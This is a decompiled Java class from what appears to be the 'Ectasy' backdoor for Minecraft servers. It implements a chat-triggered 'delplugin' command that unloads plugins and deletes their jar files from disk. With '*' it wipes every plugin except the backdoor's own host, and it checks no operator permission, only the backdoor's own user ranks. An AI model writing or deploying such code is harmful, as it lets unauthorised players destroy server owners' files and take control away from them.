package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.io.IOException;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Paths;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

@CommandInfo(
   name = "delplugin",
   description = "Unload then delete a plugin",
   blatant = true,
   rank = Rank.LITE
)
public class DeletePluginCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length < 1) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use delplugin <plugin name> or disable *");
      } else {
         if (var3[0].equalsIgnoreCase("*")) {
            for(Plugin var7 : Bukkit.getServer().getPluginManager().getPlugins()) {
               if (!var7.getName().equals(Ectasy.parentPlugin.getDescription().getName())) {
                  delete(var7.getName());
               }
            }

            ChatUtil.sendChat(var1.getPlayer(), "Deleted all plugins on the server");
         } else if (Bukkit.getPluginManager().getPlugin(var3[0]) == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The plugin does not exists. (Cap Sensitive)");
         } else {
            delete(var3[0]);
            ChatUtil.sendChat(var1.getPlayer(), var3[0] + " is now deleted.");
         }
      }
   }

   public DeletePluginCommand() {
   }

   private static void delete(String var0) {
      ClassLoader var1 = Bukkit.getPluginManager().getPlugin(var0).getClass().getClassLoader();
      if (var1 instanceof URLClassLoader) {
         try {
            ((URLClassLoader)var1).close();
         } catch (IOException ignored) {
         }

         try {
            Files.delete(Paths.get("plugins/" + var0 + ".jar"));
         } catch (IOException ignored) {
         }

         System.gc();
      }
   }
}
